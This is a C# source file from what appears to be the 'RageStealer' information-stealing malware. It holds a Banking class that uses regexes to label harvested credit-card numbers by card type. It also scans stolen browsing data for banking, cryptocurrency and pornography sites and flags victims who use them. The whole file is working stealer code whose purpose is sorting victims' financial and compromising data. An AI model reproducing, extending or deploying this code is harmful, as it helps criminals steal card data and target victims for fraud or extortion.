using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text.RegularExpressions;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer;

internal sealed class Banking
{
	private static readonly Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
	{
		{
			"Amex Card",
			new Regex("^3[47][0-9]{13}$")
		},
		{
			"BCGlobal",
			new Regex("^(6541|6556)[0-9]{12}$")
		},
		{
			"Carte Blanche Card",
			new Regex("^389[0-9]{11}$")
		},
		{
			"Diners Club Card",
			new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
		},
		{
			"Discover Card",
			new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
		},
		{
			"Insta Payment Card",
			new Regex("^63[7-9][0-9]{13}$")
		},
		{
			"JCB Card",
			new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
		},
		{
			"KoreanLocalCard",
			new Regex("^9[0-9]{15}$")
		},
		{
			"Laser Card",
			new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
		},
		{
			"Maestro Card",
			new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
		},
		{
			"Mastercard",
			new Regex("5[1-5][0-9]{14}$")
		},
		{
			"Solo Card",
			new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
		},
		{
			"Switch Card",
			new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
		},
		{
			"Union Pay Card",
			new Regex("^(62[0-9]{14,17})$")
		},
		{
			"Visa Card",
			new Regex("4[0-9]{12}(?:[0-9]{3})?$")
		},
		{
			"Visa Master Card",
			new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
		},
		{
			"Express Card",
			new Regex("3[47][0-9]{13}$")
		}
	};

	public static string DetectCreditCardType(string number)
	{
		foreach (KeyValuePair<string, Regex> creditCardType in CreditCardTypes)
		{
			if (creditCardType.Value.Match(number.Replace(" ", "")).Success)
			{
				return creditCardType.Key;
			}
		}
		return "Unknown";
	}

	private static bool AppendValue(string value, List<string> domains)
	{
		string text = value.Replace("www.", "").ToLower();
		if (text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo"))
		{
			return false;
		}
		if (text.StartsWith("."))
		{
			text = text.Substring(1);
		}
		try
		{
			text = new Uri(text).Host;
		}
		catch (UriFormatException)
		{
		}
		text = Path.GetFileNameWithoutExtension(text);
		text = text.Replace(".com", "").Replace(".org", "");
		foreach (string domain in domains)
		{
			if (text.ToLower().Replace(" ", "").Contains(domain.ToLower().Replace(" ", "")))
			{
				return false;
			}
		}
		text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
		domains.Add(text);
		return true;
	}

	private static void DetectCryptocurrencyServices(string value)
	{
		string[] cryptoServices = Detects.CryptoServices;
		foreach (string value2 in cryptoServices)
		{
			if (value.ToLower().Contains(value2) && value.Length < 25 && AppendValue(value, Counter.DetectedCryptoServices))
			{
				Counter.CryptoServices = true;
				break;
			}
		}
	}

	private static void DetectBankingServices(string value)
	{
		string[] bankingServices = Detects.BankingServices;
		foreach (string value2 in bankingServices)
		{
			if (value.ToLower().Contains(value2) && value.Length < 25 && AppendValue(value, Counter.DetectedBankingServices))
			{
				Counter.BankingServices = true;
				break;
			}
		}
	}

	private static void DetectPornServices(string value)
	{
		string[] pornServices = Detects.PornServices;
		foreach (string value2 in pornServices)
		{
			if (value.ToLower().Contains(value2) && value.Length < 25 && AppendValue(value, Counter.DetectedPornServices))
			{
				Counter.PornServices = true;
				break;
			}
		}
	}

	public static void ScanData(string value)
	{
		DetectBankingServices(value);
		DetectCryptocurrencyServices(value);
		DetectPornServices(value);
	}
}
